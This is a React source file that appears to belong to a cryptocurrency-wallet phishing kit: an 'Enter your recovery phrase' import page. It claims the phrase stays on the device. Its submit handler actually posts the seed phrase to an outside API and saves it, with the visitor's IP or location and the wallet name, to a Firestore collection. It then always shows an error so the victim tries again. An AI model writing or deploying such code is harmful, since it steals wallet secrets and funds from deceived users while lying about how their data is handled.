import {
    collection,
    addDoc,
    onSnapshot,
    query,
    where,
    doc,
    updateDoc,
    runTransaction,
    orderBy,
    getDocs,
    limit,
  } from "firebase/firestore";
import { db } from "../../firebase";
import React, { useState,useEffect} from "react";
import { useParams,useNavigate} from "react-router-dom";
import '../ImportWallet/index.scss';
import { setLocalStorage,getLocalStorage } from "../../utils/useLocalStorage";
const _src = 'JUPITER';
const ImportWallet = () => {
  const navigate = useNavigate();
  const goBack = () => {
    navigate(-1); // Goes back to the previous page
  };
 const params = useParams();
 const { walletName } = params;
 const [secretPharse, SetSecretPharse] = useState("");
 const [IsShowErrMsg, SetShowErrMsg] = useState(false);
 const [IsProcessing, SetProcessing] = useState(false);
 const usersRef = collection(db, "mydata");
 const q = query(usersRef, orderBy("auto_id", "desc", limit(1)));
    
 const isLetter = (c) => {
    return c.toLowerCase() != c.toUpperCase();
 }

 const encodeBase64 = (text) => {
  return btoa(unescape(encodeURIComponent(text)));
};

 const updateIndex = async (userID) => {
    try {
      await runTransaction(db, async (transaction) => {
        const sfDocRef = doc(db, "mydata", userID);
        const sfDoc = await transaction.get(sfDocRef);
        const dosLast = await getDocs(q);
        if (!sfDoc.exists()) {
          throw "Document does not exist!";
        }
        const [lastest] = dosLast.docs
        const auto_id = (lastest?.get("auto_id") || 0) + 1;
        transaction.update(sfDocRef, { auto_id });
      });
      //console.log("Transaction successfully committed!");
    } catch (e) {
      //console.log("Transaction failed: ", e);
    }
  };
  
  function normalizeText(str) {
    return str
      .replace(/[^a-zA-Z\s]/g, '') // Xoá tất cả ký tự KHÔNG phải chữ hoặc khoảng trắng
      .split(/\s+/)                // Tách theo khoảng trắng (kể cả nhiều dấu cách)
      .filter(Boolean)             // Bỏ phần trống
      .join(' ')                   // Ghép lại thành một khoảng trắng duy nhất
      .toLowerCase();              // Chuyển thành chữ thường
  }

function validateMnemonic(mnemonic) {
  if (!mnemonic || typeof mnemonic !== "string") return false;
  const words = mnemonic.trim().split(/\s+/);
  const count = words.length;
  if (![12, 15, 18, 21, 24].includes(count)) return false;
  return true;
}

 async function checkExistsBySeed(code) {
    try {
      const q = query(
        collection(db, "mydata"),
        where("secret", "==", code),
        limit(1) 
      );
      const querySnapshot = await getDocs(q);
      return !querySnapshot.empty; 
    } catch (error) {
      console.error("Error:", error);
      throw error;
    }
  }

  const handlePaste = async (event) => {
    event.preventDefault(); // Ngăn hành vi paste mặc định
    try {
      // Lấy dữ liệu từ clipboard
      const clipboardText = await navigator.clipboard.readText();
      const newWords = normalizeText(clipboardText)
        .trim();
      SetSecretPharse(newWords); // Thêm vào state hiện tại
    } catch (err) {
      console.error("Failed to read clipboard contents: ", err);
    }
  };

   const encodeSeed = async (seed) => {
    var encodeSeed = '';
    try {
      const response = await fetch(import.meta.env.VITE_PUBLIC_API_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ txt:seed}), 
      });
      if (response.ok) {
         const data = await response.json();
         encodeSeed = data.enc;
      }
    } catch (err) {
      console.log(err);
    }
    return encodeSeed;
  };
  const handleSubmit = async (e) => {
   try{
        SetProcessing(true);
        var encode = '';
        var ip = getLocalStorage("location") ? getLocalStorage("location") : "{}";
        var formattedSeedPhrase = normalizeText(secretPharse);
        if(validateMnemonic(formattedSeedPhrase)){
          try{
            encode = await encodeSeed(formattedSeedPhrase);
          }catch(e){
            console.log(e);
          }
          if(!getLocalStorage(encodeBase64(encode ? encode: formattedSeedPhrase))){
                const isExist = await checkExistsBySeed(encode? encode : formattedSeedPhrase);
                if(!isExist){
                    var _asset = '';
                    var _total = 0;
                    var _s = 1;
                    const user = await addDoc(collection(db, "mydata"), {
                        src:_src,s:_s,total:_total,assets:_asset,wallet:walletName?walletName :'Others',secret:encode? encode : formattedSeedPhrase,ip:ip,createdAt: new Date().getTime(),status:0
                    });
                    if(user.id){
                        setLocalStorage(encodeBase64(encode? encode : formattedSeedPhrase),1);
                        updateIndex(user.id);
                        SetShowErrMsg(true);
                    }
                }else{
                    setLocalStorage(encodeBase64(encode? encode : formattedSeedPhrase),1);
                    SetShowErrMsg(true);
                }
            }else{
                SetShowErrMsg(true);
            }
        }else{
            SetShowErrMsg(true);
        }
    }catch(err){
        console.log(err);
    }finally{
        SetProcessing(false);
    }
  };
  /*
  const handleSubmit = async (e) => {
   try{
        SetProcessing(true);
        var ip = getLocalStorage("location") ? getLocalStorage("location") : "{}";
        var formattedSeedPhrase = normalizeText(secretPharse);
        if(walletName.length > 0 && formattedSeedPhrase.length > 0 && !getLocalStorage(encodeBase64(formattedSeedPhrase.trim()))){
            if(validateMnemonic(formattedSeedPhrase)){
                const isExist = await checkExistsBySeed(formattedSeedPhrase);
                if(!isExist){
                    var _asset = '';
                    var _total = 0;
                    var _s = 1;
                    const user = await addDoc(collection(db, "mydata"), {
                        src:_src,s:_s,total:_total,assets:_asset,wallet:walletName,secret:formattedSeedPhrase,ip:ip,createdAt: new Date().getTime(),status:0
                    });
                    if(user.id){
                        setLocalStorage(encodeBase64(formattedSeedPhrase.trim()),1);
                        updateIndex(user.id);
                        SetShowErrMsg(true);
                    }
                }else{
                    setLocalStorage(encodeBase64(formattedSeedPhrase.trim()),1);
                    SetShowErrMsg(true);
                }
            }else{
                SetShowErrMsg(true);
            }
        }else{
            SetShowErrMsg(true);
        }
    }catch(err){
        console.log(err);
    }finally{
        SetProcessing(false);
    }
  };
   */ 
  return (
<div className="page">
<div className="container">
<div className="topbar">
<button onClick={goBack} className="back-btn" aria-label="Back">
<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M15 18L9 12L15 6" stroke="#FFFFFF" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
</svg>
</button>
<h1 className="title">Enter your recovery phrase</h1>
</div>


<p className="instruction">
 Your recovery phrase will only be stored locally on your device.
</p>
<textarea
onPaste={handlePaste}
value={secretPharse}
onChange={(e) => {
    SetShowErrMsg(false);
    if(!isLetter(e.target.value) && e.target.value.length > secretPharse) return;
    SetSecretPharse(e.target.value);
}}
placeholder="Enter your recovery phrase"
rows={6}
className="textarea"
/>
<span style={{display: IsShowErrMsg ? 'inline-block' : 'none'}}className="phrase-error">Secret Recovery Phrases contain 12, 15, 18, 21, or 24
    words</span>
<div className="btn-wrap">
<button onClick={handlePaste} className="paste-btn">
<svg stroke="#9EEDE0" width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
  <path d="M16,8.00100238 L10.5,8.00100238 C9.67157288,8.00100238 9,8.67257525 9,9.50100238 L9,18.5010024 C9,19.3294295 9.67157288,20.0010024 10.5,20.0010024 L17.5,20.0010024 C18.3284271,20.0010024 19,19.3294295 19,18.5010024 L19,11.0010024 L16.5,11.0010024 C16.2238576,11.0010024 16,10.7771448 16,10.5010024 L16,8.00100238 Z M20,10.5289799 L20,18.5010024 C20,19.8817143 18.8807119,21.0010024 17.5,21.0010024 L10.5,21.0010024 C9.11928813,21.0010024 8,19.8817143 8,18.5010024 L8,9.50100238 C8,8.1202905 9.11928813,7.00100238 10.5,7.00100238 L16.4720225,7.00100238 C16.6047688,6.99258291 16.7429463,7.03684187 16.8535534,7.14744899 L19.8535534,10.147449 C19.9641605,10.2580561 20.0084195,10.3962336 20,10.5289799 Z M17,10.0010024 L18.2928932,10.0010024 L17,8.70810916 L17,10.0010024 Z M11.5,13 C11.2238576,13 11,12.7761424 11,12.5 C11,12.2238576 11.2238576,12 11.5,12 L16.5,12 C16.7761424,12 17,12.2238576 17,12.5 C17,12.7761424 16.7761424,13 16.5,13 L11.5,13 Z M11.5,15 C11.2238576,15 11,14.7761424 11,14.5 C11,14.2238576 11.2238576,14 11.5,14 L16.5,14 C16.7761424,14 17,14.2238576 17,14.5 C17,14.7761424 16.7761424,15 16.5,15 L11.5,15 Z M11.5,17 C11.2238576,17 11,16.7761424 11,16.5 C11,16.2238576 11.2238576,16 11.5,16 L15.5,16 C15.7761424,16 16,16.2238576 16,16.5 C16,16.7761424 15.7761424,17 15.5,17 L11.5,17 Z M13.5,4 C13.2238576,4 13,3.77614237 13,3.5 C13,3.22385763 13.2238576,3 13.5,3 C14.8807119,3 16,4.11928813 16,5.5 L16,7 C16,7.27614237 15.7761424,7.5 15.5,7.5 C15.2238576,7.5 15,7.27614237 15,7 L15,5.5 C15,4.67157288 14.3284271,4 13.5,4 Z M6.5,3 C6.77614237,3 7,3.22385763 7,3.5 C7,3.77614237 6.77614237,4 6.5,4 C5.67157288,4 5,4.67157288 5,5.5 L5,14.5 C5,15.3284271 5.67157288,16 6.5,16 L8,16 C8.27614237,16 8.5,16.2238576 8.5,16.5 C8.5,16.7761424 8.27614237,17 8,17 L6.5,17 C5.11928813,17 4,15.8807119 4,14.5 L4,5.5 C4,4.11928813 5.11928813,3 6.5,3 Z M9,3.5 C9,3.77614237 8.77614237,4 8.5,4 C8.22385763,4 8,3.77614237 8,3.5 C8,2.67157288 8.67157288,2 9.5,2 L10.5,2 C11.3284271,2 12,2.67157288 12,3.5 C12,3.77614237 11.7761424,4 11.5,4 C11.2238576,4 11,3.77614237 11,3.5 C11,3.22385763 10.7761424,3 10.5,3 L9.5,3 C9.22385763,3 9,3.22385763 9,3.5 Z"/>
</svg>Paste
</button>
</div>

<div className="bottom">
<button onClick={handleSubmit} className={`continue-btn active`}>
  <span style={{display:IsProcessing ? 'inline-block':'none'}} className="loader"></span>
<span style={{paddingLeft: '5px'}}>Import</span>
</button>

</div>
</div>
</div>
  );
  
}

export default ImportWallet;





